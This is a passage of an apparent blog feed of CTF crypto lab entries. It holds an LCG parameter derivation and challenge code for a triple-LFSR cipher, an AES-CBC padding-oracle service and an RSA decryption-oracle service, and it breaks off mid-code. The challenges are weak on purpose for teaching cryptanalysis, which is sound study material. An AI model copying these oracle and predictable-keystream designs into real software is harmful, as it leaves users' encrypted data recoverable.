Unknown: S_0&amp;amp;=Seed,\ A,\ B,\ m = 2^{32} \
Given: S_1&amp;amp;,\ S_2,\ S_3\
S_1 &amp;amp;\equiv (AS_0\ +\ B)\ %\ m\
S_2 &amp;amp;\equiv (AS_1\ +\ B)\ %\ m\
S_3 &amp;amp;\equiv (AS_2\ +\ B)\ %\ m\
\end{aligned}
$$&lt;/p>
&lt;p>Derived A
$$
\begin{aligned}
&amp;amp;\left{
\begin{array}{c}
S_2 &amp;amp;\equiv (AS_1\ +\ B)\ %\ m\
S_3 &amp;amp;\equiv (AS_2\ +\ B)\ %\ m
\end{array}
\right.
\ \ \ \ \ \ minus \ two \ formula\ \
&amp;amp;\to (S_2-S_3) \equiv (AS_1\ +\ B)\ %\ m-(AS_2\ +\ B)\ %\ m \
&amp;amp;\to (S_2-S_3)\ % \ m\equiv [(AS_1\ +\ B)\ %\ m-(AS_2\ +\ B)\ %\ m]\ %\ m \
&amp;amp;\to (S_2-S_3)\ % \ m\equiv [(AS_1\ +\ B)-(AS_2\ +\ B)]\ %\ m \
&amp;amp;\to (S_2-S_3)\ % \ m\equiv \ A\ (S_1-S_2)\ \ %\ m =(S_2-S_3)\
A&amp;amp;=((S_2-S_3)(S_1-S_2)^{-1})\ %\ m
\end{aligned}
$$&lt;/p></description></item><item><title>Simple Crypto - 0x03(2023 Lab - COR)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x032023-lab---cor/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x032023-lab---cor/</guid><description>&lt;h1 id="simple-crypto---0x032023-lab---cor">
 Simple Crypto - 0x03(2023 Lab - COR)
 &lt;a class="anchor" href="#simple-crypto---0x032023-lab---cor">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://hackmd.io/@SBK6401/rkiE18Kas">Simple Crypto - 0x03(Lab - LFSR)&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> random
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> secret &lt;span style="color:#f92672">import&lt;/span> FLAG
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">LFSR&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> __init__(self, tap, state):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>_tap &lt;span style="color:#f92672">=&lt;/span> tap
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>_state &lt;span style="color:#f92672">=&lt;/span> state
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">getbit&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> f &lt;span style="color:#f92672">=&lt;/span> sum([self&lt;span style="color:#f92672">.&lt;/span>_state[i] &lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>_tap]) &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> x &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>_state[&lt;span style="color:#ae81ff">0&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>_state &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>_state[&lt;span style="color:#ae81ff">1&lt;/span>:] &lt;span style="color:#f92672">+&lt;/span> [f]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> x
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">triLFSR&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> __init__(self, lfsr1, lfsr2, lfsr3):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>lfsr1 &lt;span style="color:#f92672">=&lt;/span> lfsr1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>lfsr2 &lt;span style="color:#f92672">=&lt;/span> lfsr2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>lfsr3 &lt;span style="color:#f92672">=&lt;/span> lfsr3
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">getbit&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> x1 &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>lfsr1&lt;span style="color:#f92672">.&lt;/span>getbit()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> x2 &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>lfsr2&lt;span style="color:#f92672">.&lt;/span>getbit()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> x3 &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>lfsr3&lt;span style="color:#f92672">.&lt;/span>getbit()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> x2 &lt;span style="color:#66d9ef">if&lt;/span> x1 &lt;span style="color:#66d9ef">else&lt;/span> x3
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lfsr1 &lt;span style="color:#f92672">=&lt;/span> LFSR([&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">5&lt;/span>], [random&lt;span style="color:#f92672">.&lt;/span>randrange(&lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#66d9ef">for&lt;/span> _ &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">19&lt;/span>)])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lfsr2 &lt;span style="color:#f92672">=&lt;/span> LFSR([&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">5&lt;/span>], [random&lt;span style="color:#f92672">.&lt;/span>randrange(&lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#66d9ef">for&lt;/span> _ &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">23&lt;/span>)])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lfsr3 &lt;span style="color:#f92672">=&lt;/span> LFSR([&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">5&lt;/span>], [random&lt;span style="color:#f92672">.&lt;/span>randrange(&lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#66d9ef">for&lt;/span> _ &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">27&lt;/span>)])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cipher &lt;span style="color:#f92672">=&lt;/span> triLFSR(lfsr1, lfsr2, lfsr3)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>flag &lt;span style="color:#f92672">=&lt;/span> map(int, &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join([&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">{:08b}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(c) &lt;span style="color:#66d9ef">for&lt;/span> c &lt;span style="color:#f92672">in&lt;/span> FLAG]))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>output &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> _ &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">200&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> output&lt;span style="color:#f92672">.&lt;/span>append(cipher&lt;span style="color:#f92672">.&lt;/span>getbit())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> b &lt;span style="color:#f92672">in&lt;/span> flag:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> output&lt;span style="color:#f92672">.&lt;/span>append(cipher&lt;span style="color:#f92672">.&lt;/span>getbit() &lt;span style="color:#f92672">^&lt;/span> b)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(output)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># [0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 0]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple Crypto - 0x03(Lab - LFSR)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x03lab---lfsr/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x03lab---lfsr/</guid><description>&lt;h1 id="simple-crypto---0x03lab---lfsr">
 Simple Crypto - 0x03(Lab - LFSR)
 &lt;a class="anchor" href="#simple-crypto---0x03lab---lfsr">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-eductf-ctf-crypto">
 tags: &lt;code>eductf&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code>
 &lt;a class="anchor" href="#tags-eductf-ctf-crypto">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/hnXtaiyvQ3s?t=945">[2022 fall] 0923 Crypto - LFSR&lt;/a>
&lt;a href="https://youtu.be/dYyNeMeDM20?t=4386">Crypto I - LFSR&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>Must read the source code first with some comment I added
:::spoiler source code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-pytho=" data-lang="pytho=">import random

# from secret import FLAG

FLAG = b&amp;#39;00001111&amp;#39;

class LFSR:
 def __init__(self, tap, state):
 self._tap = tap
 self._state = state

 def getbit(self):
 # f is the new bit that append in last position
 f = sum([self._state[i] for i in self._tap]) &amp;amp; 1

 # x is the output bit
 x = self._state[0]
 
 # self._state is a new state
 self._state = self._state[1:] + [f]
 return x

class triLFSR:
 def __init__(self, lfsr1, lfsr2, lfsr3):
 self.lfsr1 = lfsr1
 self.lfsr2 = lfsr2
 self.lfsr3 = lfsr3

 def getbit(self):
 x1 = self.lfsr1.getbit()
 x2 = self.lfsr2.getbit()
 x3 = self.lfsr3.getbit()
 return x2 if x1 else x3
# These are the state of lfsr1, lfsr2, and lfsr3
A = [random.randrange(2) for _ in range(27)]
B = [random.randrange(2) for _ in range(23)]
C = [random.randrange(2) for _ in range(25)]
print(A, B, C)

# tap is a filter that decide the last bit is 1 or 0
tap1 = [0, 13, 16, 26]
tap2 = [0, 5, 7, 22]
tap3 = [0, 17, 19, 24]

lfsr1 = LFSR(tap1, A)
lfsr2 = LFSR(tap2, B)
lfsr3 = LFSR(tap3, C)
cipher = triLFSR(lfsr1, lfsr2, lfsr3)

# Transfer the flag to ascii code and expressed in binary
# e.g. FLAG = &amp;#39;00001111&amp;#39; → &amp;#39;3030303031313131&amp;#39; → &amp;#39;001100000011000000110000...00110001&amp;#39;(64 bits)
flag = map(int, &amp;#39;&amp;#39;.join([&amp;#34;{:08b}&amp;#34;.format(c) for c in FLAG]))

output = []

for b in flag:
 # print(b)
 output.append(cipher.getbit() ^ b)

for _ in range(200):
 output.append(cipher.getbit())

# print(output)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Crypto - 0x04(2023 Lab - POA)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x042023-lab---poa/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x042023-lab---poa/</guid><description>&lt;h1 id="simple-crypto---0x042023-lab---poa">
 Simple Crypto - 0x04(2023 Lab - POA)
 &lt;a class="anchor" href="#simple-crypto---0x042023-lab---poa">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/dYyNeMeDM20?si=BEvBPBzCsg8oWv_Q&amp;amp;t=8317"> Crypto I - Timmy&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#! /usr/bin/python3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> Crypto.Cipher &lt;span style="color:#f92672">import&lt;/span> AES
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> os
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> secret &lt;span style="color:#f92672">import&lt;/span> FLAG
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">pad&lt;/span>(data, block_size):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> data &lt;span style="color:#f92672">+=&lt;/span> bytes([&lt;span style="color:#ae81ff">0x80&lt;/span>] &lt;span style="color:#f92672">+&lt;/span> [&lt;span style="color:#ae81ff">0x00&lt;/span>] &lt;span style="color:#f92672">*&lt;/span> (&lt;span style="color:#ae81ff">15&lt;/span> &lt;span style="color:#f92672">-&lt;/span> len(data) &lt;span style="color:#f92672">%&lt;/span> block_size))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> data
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># padding style: &amp;lt;oooooo[0x80][0x00]...[0x00]&amp;gt; (find first [0x80])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">unpad&lt;/span>(data, block_size):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> len(data) &lt;span style="color:#f92672">%&lt;/span> block_size:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">raise&lt;/span> &lt;span style="color:#a6e22e">ValueError&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> padding_len &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">1&lt;/span>, len(data) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> data[&lt;span style="color:#f92672">-&lt;/span>i] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0x80&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> padding_len &lt;span style="color:#f92672">=&lt;/span> i
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">elif&lt;/span> data[&lt;span style="color:#f92672">-&lt;/span>i] &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0x00&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">raise&lt;/span> &lt;span style="color:#a6e22e">ValueError&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">raise&lt;/span> &lt;span style="color:#a6e22e">ValueError&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> data[:&lt;span style="color:#f92672">-&lt;/span>padding_len]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>key &lt;span style="color:#f92672">=&lt;/span> os&lt;span style="color:#f92672">.&lt;/span>urandom(&lt;span style="color:#ae81ff">16&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cipher &lt;span style="color:#f92672">=&lt;/span> AES&lt;span style="color:#f92672">.&lt;/span>new(key, AES&lt;span style="color:#f92672">.&lt;/span>MODE_CBC)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ct &lt;span style="color:#f92672">=&lt;/span> cipher&lt;span style="color:#f92672">.&lt;/span>encrypt(pad(FLAG, AES&lt;span style="color:#f92672">.&lt;/span>block_size))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>iv &lt;span style="color:#f92672">=&lt;/span> cipher&lt;span style="color:#f92672">.&lt;/span>iv
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print((iv &lt;span style="color:#f92672">+&lt;/span> ct)&lt;span style="color:#f92672">.&lt;/span>hex())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># same encryption&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> inp &lt;span style="color:#f92672">=&lt;/span> bytes&lt;span style="color:#f92672">.&lt;/span>fromhex(input()&lt;span style="color:#f92672">.&lt;/span>strip()) &lt;span style="color:#75715e"># hex style input&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> iv, ct &lt;span style="color:#f92672">=&lt;/span> inp[:&lt;span style="color:#ae81ff">16&lt;/span>], inp[&lt;span style="color:#ae81ff">16&lt;/span>:] &lt;span style="color:#75715e"># get first 16 bytes from input &lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cipher &lt;span style="color:#f92672">=&lt;/span> AES&lt;span style="color:#f92672">.&lt;/span>new(key, AES&lt;span style="color:#f92672">.&lt;/span>MODE_CBC, iv) 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pt &lt;span style="color:#f92672">=&lt;/span> unpad(cipher&lt;span style="color:#f92672">.&lt;/span>decrypt(ct), AES&lt;span style="color:#f92672">.&lt;/span>block_size)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;Well received :)&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span> &lt;span style="color:#a6e22e">ValueError&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;Something went wrong :(&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple Crypto - 0x05(2023 Lab - LSB)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x052023-lab---lsb/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x052023-lab---lsb/</guid><description>&lt;h1 id="simple-crypto---0x052023-lab---lsb">
 Simple Crypto - 0x05(2023 Lab - LSB)
 &lt;a class="anchor" href="#simple-crypto---0x052023-lab---lsb">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.youtube.com/live/mqQ2zgK8a0Y?si=GRgtEKGHsCNcKuqU&amp;amp;t=7176"> [edu-ctf 2023] week01 - crypto1 &lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#! /usr/bin/python3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> Crypto.Util.number &lt;span style="color:#f92672">import&lt;/span> bytes_to_long, getPrime
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> os
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> secret &lt;span style="color:#f92672">import&lt;/span> FLAG
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p &lt;span style="color:#f92672">=&lt;/span> getPrime(&lt;span style="color:#ae81ff">1024&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>q &lt;span style="color:#f92672">=&lt;/span> getPrime(&lt;span style="color:#ae81ff">1024&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>n &lt;span style="color:#f92672">=&lt;/span> p &lt;span style="color:#f92672">*&lt;/span> q
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>phi &lt;span style="color:#f92672">=&lt;/span> (p &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> (q &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>e &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">65537&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>d &lt;span style="color:#f92672">=&lt;/span> pow(e, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>, phi)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>m &lt;span style="color:#f92672">=&lt;/span> bytes_to_long(FLAG &lt;span style="color:#f92672">+&lt;/span> os&lt;span style="color:#f92672">.&lt;/span>urandom(&lt;span style="color:#ae81ff">256&lt;/span> &lt;span style="color:#f92672">-&lt;/span> len(FLAG)))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">assert&lt;/span> m &lt;span style="color:#f92672">&amp;lt;&lt;/span> n
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>enc &lt;span style="color:#f92672">=&lt;/span> pow(m, e, n)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(n)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(e)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(enc)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> inp &lt;span style="color:#f92672">=&lt;/span> int(input()&lt;span style="color:#f92672">.&lt;/span>strip())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pt &lt;span style="color:#f92672">=&lt;/span> pow(inp, d, n)
